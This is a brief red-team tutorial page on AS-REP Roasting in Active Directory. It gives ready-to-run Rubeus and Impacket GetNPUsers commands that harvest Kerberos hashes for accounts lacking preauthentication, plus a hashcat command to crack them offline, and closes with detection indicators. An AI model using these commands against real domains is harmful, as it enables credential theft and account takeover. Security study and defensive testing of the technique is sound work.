# AS-REP Roasting

Source: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat

## Overview

AS-REP Roasting retrieves password hashes for users that have **"Do not require Kerberos preauthentication"** enabled.

These hashes can then be cracked offline, similar to Kerberoasting.

## Execution

### Using Rubeus
```powershell
.\Rubeus.exe asreproast
```

### Using Impacket (from Linux)
```bash
python3 GetNPUsers.py offense.local/ -usersfile users.txt -format hashcat -dc-ip 10.0.0.1
python3 GetNPUsers.py offense.local/ -no-pass -dc-ip 10.0.0.1
```

## Cracking with Hashcat

Hash format from Rubeus (insert `23` after `$krb5asrep$`):
```
$krb5asrep$23$spot@offense.local:<hash>
```

Crack:
```bash
hashcat -m18200 '$krb5asrep$23$spot@offense.local:<hash>' -a 0 /usr/share/wordlists/rockyou.txt
```

## Detection

- Event ID **4768** with encryption type 0x17 (RC4, etype 23) and no preauth
- Users with `DONT_REQ_PREAUTH` flag set in UAC

## References
- https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
- https://jsecurity101.com/2019/IOC-differences-between-Kerberoasting-and-AsRep-Roasting/
